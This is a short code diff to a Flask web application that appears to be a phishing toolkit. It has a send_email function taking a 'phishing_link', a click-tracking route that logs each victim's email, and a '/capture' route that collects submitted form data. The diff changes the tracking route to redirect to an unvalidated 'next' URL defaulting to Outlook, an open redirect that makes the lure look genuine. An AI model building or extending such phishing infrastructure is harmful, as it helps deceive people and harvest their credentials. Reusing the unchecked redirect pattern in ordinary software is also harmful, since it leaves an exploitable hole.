@@ -96,10 +96,14 @@ def send_email(recipient_email, recipient_name, phishing_link):
 @app.route("/track_open")
 def track_open():
     email = request.args.get("email")
+    next_url = request.args.get("next", "https://outlook.com")  # URL de redirection par défaut
+
     if email:
         db.session.add(Interaction(email=email, event_type="lien cliqué"))
         db.session.commit()
-    return "", 204  # Retourne une réponse vide
+    
+    return redirect(next_url)  # Redirige l'utilisateur vers la page cible
+
 @app.route("/capture", methods=["POST"])
 def capture():
     email = request.form.get("email")
